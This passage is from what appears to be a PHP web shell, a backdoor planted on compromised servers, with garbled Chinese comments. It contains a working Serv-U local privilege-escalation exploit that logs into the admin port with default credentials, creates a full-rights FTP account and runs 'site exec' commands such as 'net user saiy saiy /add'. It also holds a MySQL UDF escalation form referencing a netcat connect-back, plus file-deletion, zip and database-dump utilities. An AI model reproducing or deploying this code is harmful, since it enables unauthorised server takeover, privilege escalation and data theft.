			 echo"Help?? View <A href=\"http://www.blackbap.com/bbs/\" target=\"_blank\">http://www.blackbap.com/bbs/</a>";
			 }
			 echo "</td></tr></table>";
			 if($nodll=="yes"){
				 $echodll = " <a href=\"#\" title=\"ʹ��˵��\" onclick=\"alert('������ļ������ᱻaddslashes������\\\\\\��� \\\\\\\��ȫ��д�������ύ��\\n\\n���������Լ���������nc -vv -l -p �˿ڣ�ȫ��������mysql�������')\">(?)</a>&nbsp;    Mixdll��:
      <input name=\"mixpath\" type=\"text\" class=\"INPUT\"  value=\"C:\mix.dll\" size=\"50\"> &nbsp;<a href=\"?action=mysqlfun\">(����function)</a>";
			 }else{
				 $echodll = "<FONT color=\"blue\">�˲������ѽ�function���й�����</FONT> &nbsp;<a href=\"?action=mysqlfun&nodll=yes\">(δ��function)</a>";
			 }
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">mysql_function��Ȩ��mix.dll��</td>
  </tr>
  <form action="?action=mysqlfun" method="POST">
  <tr class="secondalt">
    <td align="center"><a href="?action=sql&type=fun">(Func)</a>&nbsp;���ض˿�:
      <input name="port" type="text" class="INPUT"  value="5438" size="6">      ��
      ����IP:
      <input name="ip" type="text" class="INPUT" value="<?=$_SERVER['REMOTE_ADDR']?>">     ��function��:
      <input name="function" type="text" class="INPUT"  value="Mixconnect"> &nbsp;<a href="?action=mix">(Mix.dll)</a>
      <br>
	  Host : <input name="host" type="text" class="INPUT"  value="localhost" size="12">        User : <input name="user" type="text" class="INPUT"  value="root" size="8">            PassWd : <input name="pass" type="text" class="INPUT"  value=""> <br>
	  <?=$echodll?>
	  <? echo"<input name=\"nodll\" value=\"".$nodll."\" type=\"hidden\">";?> </td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="ִ��">��
      <input name="Submit" type="reset" class="INPUT" value="����"></td>
  </tr>  
  </form>
    <tr class="secondalt">
    <td align="center">Remember,Love is a dieing dream....</td>
  </tr>
</table>
<?
}
elseif($_GET['action'] == "SUExp")
{
    if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "")
    {
        echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
        $sendbuf = "";
        $recvbuf = "";
        $domain  = "-SETDOMAIN\r\n".
                "-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n".
                "-TZOEnable=0\r\n".
                " TZOKey=\r\n";
        $adduser = "-SETUSERSETUP\r\n".
                "-IP=0.0.0.0\r\n".
                "-PortNo=21\r\n".
                "-User=".$user."\r\n".
                "-Password=".$password."\r\n".
                "-HomeDir=c:\\\r\n".
                "-LoginMesFile=\r\n".
                "-Disable=0\r\n".
                "-RelPaths=1\r\n".
                "-NeedSecure=0\r\n".
                "-HideHidden=0\r\n".
                "-AlwaysAllowLogin=0\r\n".
                "-ChangePassword=0\r\n".
                "-QuotaEnable=0\r\n".
                "-MaxUsersLoginPerIP=-1\r\n".
                "-SpeedLimitUp=0\r\n".
                "-SpeedLimitDown=0\r\n".
                "-MaxNrUsers=-1\r\n".
                "-IdleTimeOut=600\r\n".
                "-SessionTimeOut=-1\r\n".
                "-Expire=0\r\n".
                "-RatioUp=1\r\n".
                "-RatioDown=1\r\n".
                "-RatiosCredit=0\r\n".
                "-QuotaCurrent=0\r\n".
                "-QuotaMaximum=0\r\n".
                "-Maintenance=None\r\n".
                "-PasswordType=Regular\r\n".
                "-Ratios=None\r\n".
                " Access=".$part."\|RWAMELCDP\r\n";
        $deldomain="-DELETEDOMAIN\r\n".
                     "-IP=0.0.0.0\r\n".
                     " PortNo=21\r\n";
        $sock = fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "SITE MAINTENANCE\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = $domain;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = $adduser;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "**********************************************************<br>";
		if($job!=="adduser"){//���費�ǽ����û�
        echo "Starting Exploit ...<br>";
        echo "**********************************************************<br>";
        $exp = fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "USER ".$user."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "PASS ".$password."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "**********************************************************<br>";
        echo "Starting Delete Domain ...<br>";
        echo "**********************************************************<br>";
        $sendbuf = $deldomain;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
		}else{
			echo "All done ...<br>";
			echo "**********************************************************<br>";
		}
        echo "</td></tr></table>";
        fclose($sock);
        if($job!=="adduser") fclose($exp);
    }
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">ͨ��Serv-U ���ع���Ա�ʺ�ִ������ & ��������</td>
  </tr>
  <form action="?action=SUExp" method="POST">
  <tr class="secondalt">
    <td align="center">LocalPort:
      <input name="SUPort" type="text" class="INPUT" id="SUPort" value="43958" size="7">      ��
      LocalUser:
      <input name="SUUser" type="text" class="INPUT" id="SUUser" value="LocalAdministrator">       ��LocalPass:
      <input name="SUPass" type="text" class="INPUT" id="SUPass" value="#l@$ak#.lk;0@P">
      <br>
	  <?php
	if($job!=="adduser"){
	?>
      Command��:
      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user saiy saiy /add" size="50"> &nbsp;<a href="?action=SUExp&job=adduser">(����û�)</a> -  <a href="#" title="ʹ��˵��" onclick="alert('��ѡ������û�����������saiy����Ϊsaiy���ʺŲ���EXP������ɾ�����saiy��\n\n����û������������Լ����һ�������Ա�ʺ��õģ���ִ��site exec ���\n\n���������������õ�һ����ѡĿ¼��ȫ����Ȩ�޵������')">(?)</a>
	  <input name="user" type="hidden" value="saiy">
	  <input name="password" type="hidden" value="saiy">
	  <input name="part" type="hidden" value="C:\"> 
	  <?}
	  else{
	?>
	�ʺ�:
      <input name="user" type="text" class="INPUT" value="saiy" size="20">  
	  ����:
      <input name="password" type="text" class="INPUT" value="saiy" size="20">  
	  Ŀ¼:
      <input name="part" type="text" class="INPUT" value="C:\" size="20">  
	  <a href="?action=SUExp">(ִ��CMD)</a> -  <a href="#" title="ʹ��˵��" onclick="alert('�ص�ִ�����')">(?)</a>
	  <input name="job" type="hidden" value="<?=$job?>"> 
	<?php
	  }
		?></td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="ִ��">��
      <input name="Submit" type="reset" class="INPUT" value="����"></td>
  </tr>  
  </form>
</table>
<?php
}
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>ϰ����Ϣ����</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================
������
======================================================*/

	// ��½���
	function loginpage() {
	global $hidden,$alexa;
if($hidden=="saiy"){
?>
<style type="text/css">
input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
</style>
<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
<form method="POST" action="">
  <tr> 
    <td height="75" align="center">
<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
	</td>
  </tr>
  </form>
  <?php
	if($alexa!=="no"){
	?>
  <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url=<? echo $_SERVER['HTTP_HOST'];?>'></SCRIPT>
  </table>
  <?}
	}?>
<?php
		exit;
	}//end loginpage()

	// ҳ�������Ϣ
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// ȥ��ת���ַ�
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// ɾ��Ŀ¼
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	} 

	// �ж϶�д���
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// ����м�ı���ɫ�滻
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// ��ȡ��ǰ���ļ�ϵͳ·��
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// ���PHP���ò���
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}

	// ��麯�����
	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}

	class zip //ZIPѹ����
{

 var $datasec, $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0; var $dirs = Array(".");
 function Add($files,$compact)
 {
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename($fn[0]))
     $ret[basename($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
 }
function get_file()
 {
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }
 function ReadCentralDir($zip,$zip_name)
 {
  $size = filesize($zip_name);
  if ($size < 277) $maximum_size = $size;
  else $maximum_size=277;
  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;
  while ($pos < $size)
  {
    $byte = @fread($zip, 1); $bytes=($bytes << 8) | Ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }
  $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));
  if ($data['comment_size'] != 0)
	  $centd['comment'] = fread($zip, $data['comment_size']);
  else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
 }
  function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);
	if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';
	if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';
	if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';
	if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }
 function add_dir($name) 
 { 
   $name = str_replace("\\", "/", $name); 
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 
   $this -> datasec[] = $fr;
   $new_offset = strlen(implode("", $this->datasec)); 
   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
   $ext = "\xff\xff\xff\xff"; 
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name;
   $this -> ctrl_dir[] = $cdrec; 
   $this -> old_offset = $new_offset; 
   $this -> dirs[] = $name;
 }
 function get_List($zip_name)
 {
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);
   @rewind($zip);
    @fseek($zip, $centd['offset']);
	for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
 }
function add_File($data, $name, $compact = 1)
 {
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());
   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');
   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);
   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );
   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
 }

 function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] < 1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | 
    ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
 }
  function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
      
   }
   fclose($zip);
   return $stat;
 }
 function ExtractFile($header,$to,$zip)
 {
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size < 2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size < 1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress�e");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size < 2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
 }
   function ReadFileHeader($zip)
  { 
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }
}

function addziparray($dir2) //���ZIP�ļ�
{
	global $dir,$zipfilearray;
	@$dirs=opendir($dir."/".$dir2);
	while (@$file=readdir($dirs)) { 
		if(!is_dir("$dir/$dir2/$file")) {
			$zipfilearray[]="$dir2/$file";
		}
		elseif($file!="."&&$file!="..") {
			addziparray("$dir2/$file");
		}
	}
	@closedir($dirs);
}

	// �������ݿ�
	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);
	
		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">����</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
			echo "  </tr>\n";
		}

		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">����</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}

		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"ȷ��\"></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";
		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}
	
	function find($path) //���ҹؼ��� 
{ 
	global $oldkey,$type,$type2,$endline,$beline; 
	if(is_dir("$path")){ 
	$tempdir=opendir("$path");
	while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
	closedir($tempdir);
	}else{ 
	if(filesize("$path")){ 
	$fp=fopen("$path","r"); 
	$msg=fread($fp, filesize("$path"));
	fclose($fp); 
if(strpos($msg, $oldkey) !== false) {
	$dir = dirname($path);
	$file = basename($path);
if($type=="list"){
